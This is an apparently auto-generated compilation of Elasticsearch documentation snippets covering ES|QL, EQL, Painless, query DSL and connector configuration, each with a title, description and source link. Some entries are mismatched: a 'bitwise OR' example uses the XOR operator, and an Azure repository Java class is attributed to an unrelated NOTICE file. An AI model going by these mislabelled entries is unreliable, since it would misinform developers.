Markdown\nDESCRIPTION: Markdown table defining the supported types for an IP-related function, showing input parameters (IP address and prefix lengths for IPv4/IPv6) and result type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/ip_prefix.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| ip | prefixLengthV4 | prefixLengthV6 | result |\n| --- | --- | --- | --- |\n| ip | integer | integer | ip |\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for GitHub Connector\nDESCRIPTION: These JSON snippets define advanced sync rules for the GitHub connector, specifying how to index documents based on specific criteria such as branch names and issue types. Each snippet outlines the filtering options available for syncing relevant repository items based on their attributes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-github.md#2025-04-21_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"repository\": \"repo_name\",\n    \"filter\": {\n      \"branch\": \"sync-rules-feature\"\n    }\n  }\n]\n```\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"repository\": \"repo_name\",\n    \"filter\": {\n      \"issue\": \"is:bug\"\n    }\n  }\n]\n```\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"repository\": \"repo_name\",\n    \"filter\": {\n      \"pr\": \"is:open\"\n    }\n  }\n]\n```\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"repository\": \"repo_name\",\n    \"filter\": {\n      \"issue\": \"is:bug\",\n      \"pr\": \"is:open\",\n      \"branch\": \"sync-rules-feature\"\n    }\n  }\n]\n```\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"filter\": {\n      \"pr\": \"is:pr is:merged label:auto-backport merged:>=2023-07-20\"\n    },\n    \"repository\": \"repo_name\"\n  },\n  {\n    \"filter\": {\n      \"pr\": \"is:pr is:merged label:auto-backport merged:>=2023-07-15\"\n    },\n    \"repository\": \"repo_name\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Including NOW Function Types in ESQL Documentation\nDESCRIPTION: This snippet includes the types information for the NOW function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/now.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/now.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Generating Disjunction of Same Field Same Function Query in Elasticsearch\nDESCRIPTION: This snippet shows how to create a disjunction query using the same function on the same field in Elasticsearch. It applies length conditions on the file_name field with an OR condition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_24\n\nLANGUAGE: eql\nCODE:\n```\nprocess where length(file_name) > 5 or length(file_name) < 10\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"bool\":{\"should\":[{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalEqlScriptUtils.length(X0),params.v1)))\",\"params\":{\"v0\":\"file_name.keyword\",\"v1\":5}}}},{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.lt(InternalEqlScriptUtils.length(X0),params.v1)))\",\"params\":{\"v0\":\"file_name.keyword\",\"v1\":10}}}}]}\n```\n\n----------------------------------------\n\nTITLE: Initializing Azure Blob Storage Repository in Java\nDESCRIPTION: This code snippet defines an abstract class for Azure blob storage repositories in Elasticsearch. It includes methods for initializing the repository, creating containers, and handling metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-ec2/licenses/slf4j-api-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nabstract class AzureBlobStorageRepository extends BlobStoreRepository {\n    private final AzureStorageService storageService;\n    private final String clientName;\n    private final String container;\n    private final LocationMode locationMode;\n    private final String baseePath;\n\n    AzureBlobStorageRepository(\n        RepositoryMetadata metadata,\n        NamedXContentRegistry namedXContentRegistry,\n        BlobStoreFactory blobStoreFactory,\n        AzureStorageService storageService,\n        String clientName,\n        String container,\n        LocationMode locationMode,\n        String basePath\n    ) {\n        super(\n            metadata,\n            namedXContentRegistry,\n            blobStoreFactory.create(metadata, AzureBlobStore.TYPE, buildSettings(metadata, clientName, container, locationMode))\n        );\n        this.storageService = storageService;\n        this.clientName = clientName;\n        this.container = container;\n        this.locationMode = locationMode;\n        this.baseePath = basePath;\n    }\n\n    private static Map<String, String> buildSettings(\n        RepositoryMetadata metadata,\n        String clientName,\n        String container,\n        LocationMode locationMode\n    ) {\n        final Map<String, String> settings = new HashMap<>(metadata.settings());\n        settings.put(AzureBlobStore.CLIENT_NAME, clientName);\n        settings.put(AzureBlobStore.CONTAINER, container);\n        if (locationMode != null) {\n            settings.put(AzureBlobStore.LOCATION_MODE, locationMode.name());\n        }\n        return settings;\n    }\n\n    @Override\n    protected void doStart() {\n        super.doStart();\n        storageService.createContainer(clientName, container);\n    }\n\n    @Override\n    protected BlobPath basePath() {\n        return BlobPath.EMPTY.add(baseePath);\n    }\n\n    @Override\n    protected ByteSizeValue chunkSize() {\n        return AzureBlobStore.MAX_CHUNK_SIZE;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Docker Image with Elastic Connector Service\nDESCRIPTION: The command runs the Elastic Connector Service within a Docker container, utilizing the specified configuration file. It requires Docker to be installed and the configuration directory to be mapped to the appropriate path. The service connects to the Elasticsearch instance to ingest data as configured.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-gmail.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \\\"elastic\\\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Using Script Filters in Elasticsearch Intervals Query\nDESCRIPTION: Example showing how to filter intervals based on their start position, end position, and internal gap count using a script filter in an intervals query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-intervals-query.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPOST _search\n{\n  \"query\": {\n    \"intervals\" : {\n      \"my_text\" : {\n        \"match\" : {\n          \"query\" : \"hot porridge\",\n          \"filter\" : {\n            \"script\" : {\n              \"source\" : \"interval.start > 10 && interval.end < 20 && interval.gaps == 0\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing All Rows of a Specific Database - JSON Snippet - JavaScript\nDESCRIPTION: This JSON snippet is designed to index all rows of a specified database in Notion by referencing the database ID. This helps to streamline the synchronization of specific data structures.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"database_query_filters\": [\n    {\n      \"database_id\": \"database_id\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Using Bitwise OR with Def Type in Painless\nDESCRIPTION: Example demonstrating how the bitwise OR operator works with Painless's dynamic 'def' type. Shows implicit casting between def and integer types during operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_37\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 5 ^ 6; <1>\ndef y = x ^ 8; <2>\n```\n\n----------------------------------------\n\nTITLE: Adding Elasticsearch Data Source to TDVT\nDESCRIPTION: Command to add an Elasticsearch data source configuration to TDVT for testing. This generates the necessary test configuration files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/connectors/tableau/tdvt/README.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$TDVT action --add_ds elastic\n```\n\n----------------------------------------\n\nTITLE: Dynamic Type Casting with `def` in Painless\nDESCRIPTION: Demonstrates valid dynamic type casts in Painless, showcasing implicit casts from `int` and `ArrayList` to `def`, and an implicit cast from `def` to `HashMap` when calling the `size()` method.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_5\n\nLANGUAGE: painless\nCODE:\n```\ndef d0 = 3;               <1>\nd0 = new ArrayList();     <2>\nObject o = new HashMap(); <3>\ndef d1 = o;               <4>\nint i = d1.size();        <5>\n```\n\n----------------------------------------\n\nTITLE: Configuring Index Options with Highlighting Example in Elasticsearch\nDESCRIPTION: Demonstrates setting up an index with custom index_options for text field, indexing a document, and performing a search with highlighting. Shows how to configure offsets for optimized highlighting performance using the unified highlighter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/index-options.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"text\": {\n        \"type\": \"text\",\n        \"index_options\": \"offsets\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"text\": \"Quick brown fox\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"text\": \"brown fox\"\n    }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"text\": {} <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Shape Index for Pre-Indexed Shape\nDESCRIPTION: This snippet shows how to create an Elasticsearch index named `shapes` with a mapping that includes a `shape` field. This index will store pre-indexed shapes that can be referenced by other queries. The `shape` type allows storing and querying geographical shapes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-shape-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /shapes\n{\n  \"mappings\": {\n    \"properties\": {\n      \"geometry\": {\n        \"type\": \"shape\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching with Geo-bounding Box Query for Geo_shape\nDESCRIPTION: This snippet demonstrates how to search for geo_shape data within a specified bounding box using a geo_bounding_box filter. The prerequisite is a geo_shape index in Elasticsearch, and the output is documents that intersect the bounding box. Availability of indexed geo_shape data is essential.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my_geoshapes/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"pin.location\": {\n            \"top_left\": {\n              \"lat\": 40.73,\n              \"lon\": -74.1\n            },\n            \"bottom_right\": {\n              \"lat\": 40.01,\n              \"lon\": -71.12\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Rare Terms Aggregation in Elasticsearch\nDESCRIPTION: Shows how to execute a rare terms aggregation on the 'genre' field in a search request, with default settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-rare-terms-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"rare_terms\": {\n        \"field\": \"genre\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Casting and Concatenating Values to Create a Version String in ESQL\nDESCRIPTION: This snippet demonstrates the use of the `::` operator for type casting in ESQL. It converts an integer to a string, concatenates it with other string literals, and finally casts the result to a VERSION type. The operation combines multiple type conversions and string concatenation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/cast.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW ver = CONCAT((\"0\"::INT + 1)::STRING, \".2.3\")::VERSION\n```\n\n----------------------------------------\n\nTITLE: Creating and Extracting Coordinates from a Geo Point in ESQL\nDESCRIPTION: This ESQL snippet demonstrates how to create a geo_point using the TO_GEOPOINT function with a WKT string, and then extract its X and Y coordinates using ST_X and ST_Y functions. The result is stored in a row with three fields: the original point, and its X and Y coordinates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_x.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW point = TO_GEOPOINT(\"POINT(42.97109629958868 14.7552534006536)\")\n| EVAL x =  ST_X(point), y = ST_Y(point)\n```\n\n----------------------------------------\n\nTITLE: Defining Java Character$UnicodeBlock Class\nDESCRIPTION: This snippet defines the nested UnicodeBlock class in the Character class, which categorizes Unicode characters into different blocks. Each UnicodeBlock represents a specified range of characters and provides a convenient way to refer to character categories by name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_7\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Character$UnicodeBlock {\n  Character.UnicodeBlock AEGEAN_NUMBERS\n  Character.UnicodeBlock ALCHEMICAL_SYMBOLS\n  Character.UnicodeBlock ALPHABETIC_PRESENTATION_FORMS\n  Character.UnicodeBlock ANCIENT_GREEK_MUSICAL_NOTATION\n  Character.UnicodeBlock ANCIENT_GREEK_NUMBERS\n  Character.UnicodeBlock ANCIENT_SYMBOLS\n  Character.UnicodeBlock ARABIC\n  Character.UnicodeBlock ARABIC_EXTENDED_A\n  Character.UnicodeBlock ARABIC_MATHEMATICAL_ALPHABETIC_SYMBOLS\n  Character.UnicodeBlock ARABIC_PRESENTATION_FORMS_A\n  Character.UnicodeBlock ARABIC_PRESENTATION_FORMS_B\n  Character.UnicodeBlock ARABIC_SUPPLEMENT\n  Character.UnicodeBlock ARMENIAN\n  Character.UnicodeBlock ARROWS\n  Character.UnicodeBlock AVESTAN\n  Character.UnicodeBlock BALINESE\n  Character.UnicodeBlock BAMUM\n  Character.UnicodeBlock BAMUM_SUPPLEMENT\n  Character.UnicodeBlock BASIC_LATIN\n  Character.UnicodeBlock BATAK\n  Character.UnicodeBlock BENGALI\n  Character.UnicodeBlock BLOCK_ELEMENTS\n  Character.UnicodeBlock BOPOMOFO\n  Character.UnicodeBlock BOPOMOFO_EXTENDED\n  Character.UnicodeBlock BOX_DRAWING\n  Character.UnicodeBlock BRAHMI\n  Character.UnicodeBlock BRAILLE_PATTERNS\n  Character.UnicodeBlock BUGINESE\n  Character.UnicodeBlock BUHID\n  Character.UnicodeBlock BYZANTINE_MUSICAL_SYMBOLS\n  Character.UnicodeBlock CARIAN\n  Character.UnicodeBlock CHAKMA\n  Character.UnicodeBlock CHAM\n  Character.UnicodeBlock CHEROKEE\n  Character.UnicodeBlock CJK_COMPATIBILITY\n  Character.UnicodeBlock CJK_COMPATIBILITY_FORMS\n  Character.UnicodeBlock CJK_COMPATIBILITY_IDEOGRAPHS\n  Character.UnicodeBlock CJK_COMPATIBILITY_IDEOGRAPHS_SUPPLEMENT\n  Character.UnicodeBlock CJK_RADICALS_SUPPLEMENT\n  Character.UnicodeBlock CJK_STROKES\n  Character.UnicodeBlock CJK_SYMBOLS_AND_PUNCTUATION\n  Character.UnicodeBlock CJK_UNIFIED_IDEOGRAPHS\n  Character.UnicodeBlock CJK_UNIFIED_IDEOGRAPHS_EXTENSION_A\n  Character.UnicodeBlock CJK_UNIFIED_IDEOGRAPHS_EXTENSION_B\n  Character.UnicodeBlock CJK_UNIFIED_IDEOGRAPHS_EXTENSION_C\n  Character.UnicodeBlock CJK_UNIFIED_IDEOGRAPHS_EXTENSION_D\n  Character.UnicodeBlock COMBINING_DIACRITICAL_MARKS\n  Character.UnicodeBlock COMBINING_DIACRITICAL_MARKS_SUPPLEMENT\n  Character.UnicodeBlock COMBINING_HALF_MARKS\n  Character.UnicodeBlock COMBINING_MARKS_FOR_SYMBOLS\n  Character.UnicodeBlock COMMON_INDIC_NUMBER_FORMS\n  Character.UnicodeBlock CONTROL_PICTURES\n  Character.UnicodeBlock COPTIC\n  Character.UnicodeBlock COUNTING_ROD_NUMERALS\n  Character.UnicodeBlock CUNEIFORM\n  Character.UnicodeBlock CUNEIFORM_NUMBERS_AND_PUNCTUATION\n  Character.UnicodeBlock CURRENCY_SYMBOLS\n  Character.UnicodeBlock CYPRIOT_SYLLABARY\n  Character.UnicodeBlock CYRILLIC\n  Character.UnicodeBlock CYRILLIC_EXTENDED_A\n  Character.UnicodeBlock CYRILLIC_EXTENDED_B\n  Character.UnicodeBlock CYRILLIC_SUPPLEMENTARY\n  Character.UnicodeBlock DESERET\n  Character.UnicodeBlock DEVANAGARI\n  Character.UnicodeBlock DEVANAGARI_EXTENDED\n  Character.UnicodeBlock DINGBATS\n  Character.UnicodeBlock DOMINO_TILES\n  Character.UnicodeBlock EGYPTIAN_HIEROGLYPHS\n  Character.UnicodeBlock EMOTICONS\n  Character.UnicodeBlock ENCLOSED_ALPHANUMERIC_SUPPLEMENT\n  Character.UnicodeBlock ENCLOSED_ALPHANUMERICS\n  Character.UnicodeBlock ENCLOSED_CJK_LETTERS_AND_MONTHS\n  Character.UnicodeBlock ENCLOSED_IDEOGRAPHIC_SUPPLEMENT\n  Character.UnicodeBlock ETHIOPIC\n  Character.UnicodeBlock ETHIOPIC_EXTENDED\n  Character.UnicodeBlock ETHIOPIC_EXTENDED_A\n  Character.UnicodeBlock ETHIOPIC_SUPPLEMENT\n  Character.UnicodeBlock GENERAL_PUNCTUATION\n  Character.UnicodeBlock GEOMETRIC_SHAPES\n  Character.UnicodeBlock GEORGIAN\n  Character.UnicodeBlock GEORGIAN_SUPPLEMENT\n  Character.UnicodeBlock GLAGOLITIC\n  Character.UnicodeBlock GOTHIC\n  Character.UnicodeBlock GREEK\n  Character.UnicodeBlock GREEK_EXTENDED\n  Character.UnicodeBlock GUJARATI\n  Character.UnicodeBlock GURMUKHI\n  Character.UnicodeBlock HALFWIDTH_AND_FULLWIDTH_FORMS\n  Character.UnicodeBlock HANGUL_COMPATIBILITY_JAMO\n  Character.UnicodeBlock HANGUL_JAMO\n  Character.UnicodeBlock HANGUL_JAMO_EXTENDED_A\n  Character.UnicodeBlock HANGUL_JAMO_EXTENDED_B\n  Character.UnicodeBlock HANGUL_SYLLABLES\n  Character.UnicodeBlock HANUNOO\n  Character.UnicodeBlock HEBREW\n  Character.UnicodeBlock HIGH_PRIVATE_USE_SURROGATES\n  Character.UnicodeBlock HIGH_SURROGATES\n  Character.UnicodeBlock HIRAGANA\n  Character.UnicodeBlock IDEOGRAPHIC_DESCRIPTION_CHARACTERS\n  Character.UnicodeBlock IMPERIAL_ARAMAIC\n  Character.UnicodeBlock INSCRIPTIONAL_PAHLAVI\n  Character.UnicodeBlock INSCRIPTIONAL_PARTHIAN\n  Character.UnicodeBlock IPA_EXTENSIONS\n  Character.UnicodeBlock JAVANESE\n  Character.UnicodeBlock KAITHI\n  Character.UnicodeBlock KANA_SUPPLEMENT\n  Character.UnicodeBlock KANBUN\n  Character.UnicodeBlock KANGXI_RADICALS\n  Character.UnicodeBlock KANNADA\n  Character.UnicodeBlock KATAKANA\n  Character.UnicodeBlock KATAKANA_PHONETIC_EXTENSIONS\n  Character.UnicodeBlock KAYAH_LI\n  Character.UnicodeBlock KHAROSHTHI\n  Character.UnicodeBlock KHMER\n  Character.UnicodeBlock KHMER_SYMBOLS\n  Character.UnicodeBlock LAO\n  Character.UnicodeBlock LATIN_1_SUPPLEMENT\n  Character.UnicodeBlock LATIN_EXTENDED_A\n  Character.UnicodeBlock LATIN_EXTENDED_ADDITIONAL\n  Character.UnicodeBlock LATIN_EXTENDED_B\n  Character.UnicodeBlock LATIN_EXTENDED_C\n  Character.UnicodeBlock LATIN_EXTENDED_D\n  Character.UnicodeBlock LEPCHA\n  Character.UnicodeBlock LETTERLIKE_SYMBOLS\n  Character.UnicodeBlock LIMBU\n  Character.UnicodeBlock LINEAR_B_IDEOGRAMS\n  Character.UnicodeBlock LINEAR_B_SYLLABARY\n  Character.UnicodeBlock LISU\n  Character.UnicodeBlock LOW_SURROGATES\n  Character.UnicodeBlock LYCIAN\n  Character.UnicodeBlock LYDIAN\n  Character.UnicodeBlock MAHJONG_TILES\n  Character.UnicodeBlock MALAYALAM\n  Character.UnicodeBlock MANDAIC\n  Character.UnicodeBlock MATHEMATICAL_ALPHANUMERIC_SYMBOLS\n  Character.UnicodeBlock MATHEMATICAL_OPERATORS\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Terms Aggregation with Exact Values in Elasticsearch\nDESCRIPTION: This example shows how to use exact string matching for including and excluding values in a terms aggregation. It creates two aggregations: one for Japanese car manufacturers and another for active car manufacturers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_13\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"JapaneseCars\": {\n      \"terms\": {\n        \"field\": \"make\",\n        \"include\": [ \"mazda\", \"honda\" ]\n      }\n    },\n    \"ActiveCarManufacturers\": {\n      \"terms\": {\n        \"field\": \"make\",\n        \"exclude\": [ \"rover\", \"jensen\" ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Romanian Stop Words\nDESCRIPTION: Defines Romanian stop words applicable for Elasticsearch text analysis, linking to the Lucene documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_32\n\nLANGUAGE: markdown\nCODE:\n```\n`_romanian_`\n:   [Romanian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/ro/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Metadata Access for Update Scripts\nDESCRIPTION: Enables retrieval and modification of document metadata in Elasticsearch update scripts, including index, ID, routing, and version information\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update_by_query.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.Metadata {\n    String getIndex()\n    String getId()\n    String getRouting()\n    long getVersion()\n    String getOp()\n    void setOp(String)\n}\n```\n\n----------------------------------------\n\nTITLE: IN Operator Usage in ESQL\nDESCRIPTION: Example showing how to use the IN operator to test if a value matches any element in a list.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/where.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\nWHERE field IN (value1, value2, ...)\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON MultiPoint in Elasticsearch\nDESCRIPTION: Example of indexing a GeoJSON MultiPoint geometry in Elasticsearch. MultiPoint represents a collection of points as an array of coordinate arrays.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"MultiPoint\",\n    \"coordinates\" : [\n      [102.0, 2.0], [103.0, 2.0]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating test case for multiple distributions in Java\nDESCRIPTION: This snippet illustrates how to create a test case that covers multiple distributions by using an abstract test case class with an abstract `distribution()` method. Subclasses override this method to specify the distribution to be tested.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/qa/packaging/README.md#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n```java\npublic abstract class MyTestCase {\n  @Test\n  public void myTest() { /* do something with the value of #distribution() */ }\n  abstract Distribution distribution();\n}\n```\n```\n\nLANGUAGE: java\nCODE:\n```\n```java\npublic class MyTestDefaultTar extends MyTestCase {\n  @Override\n  Distribution distribution() { return Distribution.DEFAULT_TAR; }\n}\n```\n```\n\n----------------------------------------\n\nTITLE: Parameter Documentation in ESQL Function Test\nDESCRIPTION: Documentation for a function parameter that accepts a number input between -1 and 1. The function returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/asin.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`number`\n:   Number between -1 and 1. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Removing Mapper Size Plugin from Elasticsearch\nDESCRIPTION: Command to remove the mapper-size plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-size.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove mapper-size\n```\n\n----------------------------------------\n\nTITLE: DISSECT Ordered Append\nDESCRIPTION: Demonstrates ordered append using numeric ordering with the append modifier\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_7\n\nLANGUAGE: esql\nCODE:\n```\nROW message=\"john jacob jingleheimer schmidt\"\n| DISSECT message \"\"\"%{+name/2} %{+name/4} %{+name/3} %{+name/1}\"\"\" APPEND_SEPARATOR=\",\"\n```\n\n----------------------------------------\n\nTITLE: Filtering Airport Data Using ST_DISJOINT in ESQL\nDESCRIPTION: Query that filters airport/city data based on geographic boundaries using ST_DISJOINT function. Selects records where the city boundary is disjoint from a specified polygon area, keeping specific fields like airport abbreviation, name, region, city, and location.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_disjoint.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE ST_DISJOINT(city_boundary, TO_GEOSHAPE(\"POLYGON((-10 -60, 120 -60, 120 60, -10 60, -10 -60))\"))\n| KEEP abbrev, airport, region, city, city_location\n```\n\n----------------------------------------\n\nTITLE: Calculating Median Salary Using ESQL MEDIAN Function\nDESCRIPTION: This ESQL query demonstrates how to use the MEDIAN function to calculate the median salary from an 'employees' data source. It also shows the equivalence of MEDIAN to the 50th PERCENTILE.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/median.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS MEDIAN(salary), PERCENTILE(salary, 50)\n```\n\n----------------------------------------\n\nTITLE: Generating MD5 and SHA256 Hashes with ESQL\nDESCRIPTION: An ESQL query that demonstrates using the hash() function to generate both MD5 and SHA256 hashes of messages. The query filters out 'Connection error' messages, computes the hashes, and keeps only the relevant columns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/hash.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE message != \"Connection error\"\n| EVAL md5 = hash(\"md5\", message), sha256 = hash(\"sha256\", message)\n| KEEP message, md5, sha256\n```\n\n----------------------------------------\n\nTITLE: Using Triple Quotes for ESQL Regular Expressions\nDESCRIPTION: This snippet shows an alternative approach using triple quotes to reduce the need for escaping in ESQL regular expressions. It simplifies the syntax by allowing a single backslash for escaping special characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/detailedDescription/rlike.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"foo ( bar\"\n| WHERE message RLIKE \"\"\"foo \\( bar\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL Function Parameters in Markdown\nDESCRIPTION: This snippet defines the parameters for an ESQL function using Markdown syntax. It specifies a single parameter 'field' and describes its purpose and accepted input types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_integer.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Input value. The input can be a single- or multi-valued column or an expression.\n```\n\n----------------------------------------\n\nTITLE: Basic Fingerprint Analyzer Usage Example\nDESCRIPTION: Demonstrates basic usage of the fingerprint analyzer with a sample text input containing special characters and repeated words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-fingerprint-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"analyzer\": \"fingerprint\",\n  \"text\": \"Yes yes, Gödel said this sentence is consistent and.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ and consistent godel is said sentence this yes ]\n```\n\n----------------------------------------\n\nTITLE: Declaring and Assigning Primitive Types in Painless\nDESCRIPTION: Examples of declaring primitive types, with and without initial assignments. Demonstrates int, double, and boolean types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nint i = 1;        \ndouble d;         \nboolean b = true; \n```\n\n----------------------------------------\n\nTITLE: Converting String to IP Value in Elasticsearch SQL\nDESCRIPTION: This SQL query demonstrates the conversion of a string input to an IP value using a custom function in Elasticsearch SQL. It tests the functionality of the IP conversion function with various input formats.\nSOURCE: 